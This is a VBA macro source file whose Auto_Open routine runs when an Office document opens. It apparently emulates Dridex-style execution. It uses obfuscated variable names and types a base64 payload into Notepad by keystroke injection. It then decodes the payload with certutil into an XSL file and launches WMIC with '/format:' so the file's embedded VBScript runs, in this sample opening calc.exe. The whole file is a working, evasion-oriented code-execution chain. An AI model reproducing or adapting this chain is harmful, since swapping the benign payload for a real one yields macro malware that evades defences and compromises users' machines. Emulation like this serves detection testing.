Public Declare PtrSafe Function SendMessage Lib "user32" Alias "SendMessageA" (ByVal hWnd As Long, ByVal wMsg As Long, ByVal wParam As Long, lParam As Any) As Long
Public Declare PtrSafe Function only_been_complete Lib "user32.dll" Alias "FindWindowExA" (ByVal or_relating As Long, ByVal i_have_got As Long, ByVal in_his_younger As String, ByVal and_she_always As String) As Long
Public Declare PtrSafe Function FindWindow Lib "user32" Alias "FindWindowA" (ByVal lpClassName As String, ByVal lpWindowName As String) As Long
Public Declare PtrSafe Function PostMessage Lib "user32" Alias "PostMessageA" (ByVal hWnd As Long, ByVal wMsg As Long, ByVal wParam As Long, ByVal lParam As Long) As Long
Public Declare PtrSafe Sub Sleep Lib "kernel32" (ByVal dwMilliseconds As Long)
Public Const WM_KEYDOWN = &H100
Public Const WM_KEYUP = &H101
Public Const WM_CHAR = &H102
Public Const WM_SYSCOMMAND As Long = &H112
Public Const SC_KEYMENU As Long = &HF100
Public Const VK_DOWN As Long = &H28
Public Const VK_RETURN As Long = &HD

Sub Auto_Open()
    Dim portrait_undoubtedly_see As String
    portrait_undoubtedly_see = "appdata"
    
    Dim pride_and_look As String
    pride_and_look = "\"

    Dim through_with As String
    through_with = ".txt"
    
    Dim arose_to_come As String
    arose_to_come = Environ(portrait_undoubtedly_see)
    
    Dim you_heard_her As String
    you_heard_her = arose_to_come & pride_and_look & "dridex" & through_with
    
    Debug.Print you_heard_her
      
    Set fs = CreateObject("Scripting.FileSystemObject")
    Set a = fs.CreateTextFile(you_heard_her, True)
    a.Close
    
    Dim exclaiming_this_as As String
    exclaiming_this_as = "wscript.shell"
    
    Dim though_he_could As String
    though_he_could = "notepad "
    
    CreateObject(exclaiming_this_as).Run (though_he_could & you_heard_her)
    
    Dim hWndNotepad     As Long
    Dim hWndNotepadEdit As Long

    hWndNotepad = FindWindow("notepad", vbNullString)

    While hWndNotepad = 0

      Sleep 100
      hWndNotepad = FindWindow("notepad", vbNullString)
    Wend

    hWndNotepadEdit = only_been_complete(hWndNotepad, 0, "Edit", vbNullString)

    Dim payload As String
    payload = "PD94bWwgdmVyc2lvbj0nMS4wJz8+CjxzdHlsZXNoZWV0CnhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L1hTTC9UcmFuc2Zvcm0iIHhtbG5zOm1zPSJ1cm46c2NoZW1hcy1taWNyb3NvZnQtY29tOnhzbHQiCnhtbG5zOnVzZXI9InBsYWNlaG9sZGVyIgp2ZXJzaW9uPSIxLjAiPgo8b3V0cHV0IG1ldGhvZD0idGV4dCIvPgoJPG1zOnNjcmlwdCBpbXBsZW1lbnRzLXByZWZpeD0idXNlciIgbGFuZ3VhZ2U9IlZCU2NyaXB0Ij4KCTwhW0NEQVRBWwoJZnVuY3Rpb24gcnVubXVtYWEoKSAKCU9uIEVycm9yIFJlc3VtZSBOZXh0CglzZXQgc2hlbGw9Y3JlYXRlb2JqZWN0KCJTaGVsbC5BcHBsaWNhdGlvbiIpCglzaGVsbC5TaGVsbEV4ZWN1dGUgImNhbGMuZXhlIgoJZW5kIGZ1bmN0aW9uCglydW5tdW1hYSgpCgldXT4gPC9tczpzY3JpcHQ+Cjwvc3R5bGVzaGVldD4"

    For i = 1 To Len(payload)
        PostMessage hWndNotepadEdit, WM_CHAR, Asc(Mid$(payload, i, 1)), 0
    Next

    Application.SendKeys "^s", True
    Application.SendKeys "^w", True
    
    Sleep (5000)
    
    CreateObject(exclaiming_this_as).Run ("certutil -decode " & you_heard_her & " " & arose_to_come & pride_and_look & "calc.xsl")
    
    Sleep (3000)
        
    CreateObject(exclaiming_this_as).Run ("WmIC")
    
    Sleep (1000)
    
    Dim hWndWMIC     As Long
    Dim that_this_civil As String
    that_this_civil = "process list /format:" & Chr(34) & arose_to_come & pride_and_look & "calc.xsl" & Chr(34)
    
    Debug.Print (that_this_civil)

    
    hWndWMIC = FindWindow("ConsoleWindowClass", "C:\Windows\System32\wbem\WMIC.exe")
    If hWndWMIC = 0 Then
        hWndWMIC = FindWindow("ConsoleWindowClass", "C:\Windows\Syswow64\wbem\WMIC.exe")
    End If

    For i = 1 To Len(that_this_civil)
        
        PostMessage hWndWMIC, WM_CHAR, Asc(Mid$(that_this_civil, i, 1)), 0
    Next
    
    Application.SendKeys "~", True
    Sleep (1000)
    
End Sub
